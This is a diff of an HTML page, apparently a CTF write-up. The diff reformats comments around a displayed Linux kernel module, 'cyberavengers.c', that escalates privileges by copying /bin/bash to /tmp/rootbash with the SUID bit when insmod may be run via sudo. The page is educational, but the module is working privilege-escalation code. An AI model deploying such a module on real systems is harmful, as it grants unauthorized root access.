@@ -682,14 +682,13 @@
   </div>
   
   <div class="code-container">
-    <h4 class="code-title" style="color: black;">cyberavengers.c - Kernel Module for Privilege Escalation</h4>
-    <pre class="code-block"><code><span class="code-comment">"
- 	cyberavengers.c - Kernel module for privilege escalation in CTF
- 	This module creates a SUID copy of /bin/bash for privilege escalation
- 	in a controlled CTF environment. It demonstrates how kernel modules
- 	can be used to gain elevated privileges when the insmod command 
- 	is allowed to be executed with sudo.
- 	#</span>
+  <h4 class="code-title" style="color: black;">cyberavengers.c - Kernel Module for Privilege Escalation</h4>
+  <pre class="code-block"><code><span class="code-comment"># cyberavengers.c - Kernel module for privilege escalation in CTF
+# 
+# This module creates a SUID copy of /bin/bash for privilege escalation
+# in a controlled CTF environment. It demonstrates how kernel modules
+# can be used to gain elevated privileges when the insmod command
+# is allowed to be executed with sudo.</span>
 
 <span class="code-preprocessor">#include &lt;linux/module.h&gt;</span>
 <span class="code-preprocessor">#include &lt;linux/kernel.h&gt;</span>
@@ -697,10 +696,8 @@
 <span class="code-preprocessor">#include &lt;linux/kthread.h&gt;</span>
 <span class="code-preprocessor">#include &lt;linux/delay.h&gt;</span>
 
-<span class="code-comment">#
- 	Thread function that creates a SUID root bash binary
- 	by copying /bin/bash to /tmp/rootbash and setting SUID permission
- </span>
+<span class="code-comment"># Thread function that creates a SUID root bash binary
+# by copying /bin/bash to /tmp/rootbash and setting SUID permission</span>
 <span class="code-keyword">static</span> <span class="code-type">int</span> <span class="code-function">reverse_shell_thread</span>(<span class="code-type">void</span> *data)
 {
     <span class="code-type">char</span> *argv[] = { 
@@ -714,15 +711,13 @@
         <span class="code-keyword">NULL</span> 
     };
     
-    <span class="code-comment"># Execute the command with elevated privileges #</span>
+    <span class="code-comment"># Execute the command with elevated privileges</span>
     call_usermodehelper(argv[<span class="code-number">0</span>], argv, envp, UMH_WAIT_EXEC);
     <span class="code-keyword">return</span> <span class="code-number">0</span>;
 }
 
-<span class="code-comment">#
-	Module initialization function
- 	Creates and runs the thread that handles privilege escalation
- #</span>
+<span class="code-comment"># Module initialization function
+# Creates and runs the thread that handles privilege escalation</span>
 <span class="code-keyword">static</span> <span class="code-type">int</span> <span class="code-keyword">__init</span> <span class="code-function">rev_init</span>(<span class="code-type">void</span>)
 {
     printk(KERN_INFO <span class="code-string">"Privilege escalation module loaded\n"</span>);
@@ -730,23 +725,21 @@
     <span class="code-keyword">return</span> <span class="code-number">0</span>;
 }
 
-<span class="code-comment">#
- 	Module cleanup function
- #</span>
+<span class="code-comment"># Module cleanup function</span>
 <span class="code-keyword">static</span> <span class="code-type">void</span> <span class="code-keyword">__exit</span> <span class="code-function">rev_exit</span>(<span class="code-type">void</span>)
 {
     printk(KERN_INFO <span class="code-string">"Privilege escalation module unloaded\n"</span>);
 }
 
-<span class="code-comment"># Register module functions #</span>
+<span class="code-comment"># Register module functions</span>
 module_init(rev_init);
 module_exit(rev_exit);
 
-<span class="code-comment"># Module metadata #</span>
+<span class="code-comment"># Module metadata</span>
 MODULE_LICENSE(<span class="code-string">"GPL"</span>);
 MODULE_AUTHOR(<span class="code-string">"CTF Participant"</span>);
 MODULE_DESCRIPTION(<span class="code-string">"CTF demonstration kernel module for privilege escalation"</span>);</code></pre>
-  </div>
+</div>
 <div class="code-container">
   <h4 class="code-title" style="color: black;">Makefile - Build Configuration for Kernel Module</h4>
   <pre class="code-block"><code><span class="code-comment"># Specify the kernel module object file to build</span>
